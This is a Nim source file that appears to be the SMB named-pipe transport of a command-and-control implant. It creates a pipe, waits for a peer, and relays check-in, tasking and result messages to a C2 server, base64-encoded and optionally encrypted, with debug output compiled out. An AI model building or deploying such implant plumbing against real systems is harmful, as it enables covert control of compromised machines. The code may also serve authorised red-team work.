import os
import json
import winim/lean
import std/options
import std/tables
import ../structs
import ../b64
import ../pivot/pivot
import ../taskQueue
import ../config

when defined(ENCRYPT_TRAFFIC):
  import ../crypto

# global variables to track connection
# state of the pipe
var
  isClientConnected: bool = false
  pipeHandle: HANDLE


template DBG(msg: string) =
  when defined(debug):
    echo msg



#[
  Creates a named pipe that is used to obtain
  the output of the assembly that gets executed.
]#
proc makeNamedPipe(pipeName: string): HANDLE  =

  const PIPE_BUFF_SIZE = 1572864 # 1.5 MegaByte

  let handle = CreateNamedPipe(pipeName,
    PIPE_ACCESS_DUPLEX.or(FILE_FLAG_FIRST_PIPE_INSTANCE),
    PIPE_TYPE_MESSAGE.or(PIPE_NOWAIT),
    PIPE_UNLIMITED_INSTANCES,
    PIPE_BUFF_SIZE, PIPE_BUFF_SIZE, 0, NULL);

  if handle == INVALID_HANDLE_VALUE:
    DBG("[-] Failed to get Handle to Named Pipe")
    return INVALID_HANDLE_VALUE
  else:
    DBG("[+] Successfully created NamedPipeHandle")
    return handle

#[
  A generic init function - not requried for HTTP
]#
proc initialize*() =

  var
    hFile: HANDLE
    pipeName = "\\\\.\\pipe\\" & connection.pipeName

  # create the
  DBG("[*] Create Named Pipe: " & pipeName)
  pipeHandle = makeNamedPipe(pipeName)

  if pipeHandle == INVALID_HANDLE_VALUE:
    DBG("[-] Failed to create pipe, aborting...")
    quit()

  #hFile = CreateFile(T(pipeName), GENERIC_WRITE, FILE_SHARE_READ, cast[LPSECURITY_ATTRIBUTES](0), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
  #
  DBG("[*] Waiting for Client connection....")

  while ConnectNamedPipe(pipeHandle, NULL) != TRUE:
    # this means that the connection attempt was during the waittime
    if GetLastError() == ERROR_PIPE_CONNECTED:
      break
    WaitForSingleObject(pipeHandle, 2000)

  DBG("[*] Client connected")
  isClientConnected = true

#[
  This functions sends the data
  to the C2 Server and retrieves the returned data.
  It handles the base64 encoding and eventually the
  encryption
]#
proc sendAndRetrData*(data: JsonNode): Option[JsonNode]  =

  #[ no client connected, no connection available ]#
  if not isClientConnected:
    return none(JsonNode)

  # if the pipe is dead, return
  if pipeHandle == INVALID_HANDLE_VALUE:
    return none(JsonNode)


  # As the communication via SMB is not
  # perfectly in sync. it required to track the
  # request and order them to the correct response

  var uniqueReqId: string

  let action = data["action"].getStr()

  #[
  if action == "checkin":
    uniqueReqId = "checkin"
  if action == "post_response":
    uniqueReqId = "post_response"
  if action == "get_tasking":
    uniqueReqId = "get_tasking"
    ]#


  DBG("[*] sendAndRetrData(action=" & action & ")")
  var sdata = $data
  var ldata = len(sdata)
  if ldata > 200:
    ldata = 200
  DBG(($data)[0..<ldata])

  var uuid = connection.uuid

  # When using AES encrypted traffic, encrypt the data
  # string to return the encrypted byte sequence
  # if NOT: only convert to seq as this is later used as seq and
  # not as string anymore var encData: seq[byte]
  var encData: seq[byte]

  when defined(ENCRYPT_TRAFFIC):
    encData = encrypt($data, connection.encryptionKey)
  else:
    encData = cast[seq[byte]]($data)

  # do the base64 encoding here "{uuid}{data}"
  var body = b64.encode(Base64Pad, cast[seq[byte]](uuid) & encData)


  writePipe(pipeHandle, body)

  # [ Reading the correct response form the Pipe ] #

  var valFound = false # to track whether the response was found
  var retData = none(JsonNode)
  const TIMEOUT = 400
  let maxTimeout = agent.sleepTimeMS * 50 # max timeout = 5 roundtrips
  var alreadySlept = 0


  while true:

    # if already present, return that and be happy
    # otherwise, read from the Pipe
    if recvResponseMap.contains(action):
      # we found some, ensure to remove that entry
      var tmpEntry = some(recvResponseMap[action])
      recvResponseMap.del(action)
      return tmpEntry

    # reading the Pipe, until data is available
    while retData.isNone:
      retData = parsePipePkt(readPipe(pipeHandle))
      # also sleep until reading
      if alreadySlept >= maxTimeout:
        DBG("[-] Waited too long, aborting")
        return none(JsonNode)
      sleep(TIMEOUT)
      alreadySlept += TIMEOUT

    alreadySlept = 0 # reset slept counter

    # Data available -> Check if the data is the right one
    DBG("Read from pipe:")
    let data = $(retData.get())
    var endS = 200
    if len(data) < 200:
      endS = len(data) - 1
    DBG(data[0..<endS])

    var retAction = retData.get()["action"].getStr()

    # if the same action is in the response, as in the request
    # return it
    if action == retAction:
      return retData
    else:
      # if not, keep track of the packet in the HashMap
      recvResponseMap[retAction] = retData.get()

    # reset for the next loop, if we somehow land here
    retData = none(JsonNode)

  DBG($retData.get())
  DBG("-> END Recv")
  return retData

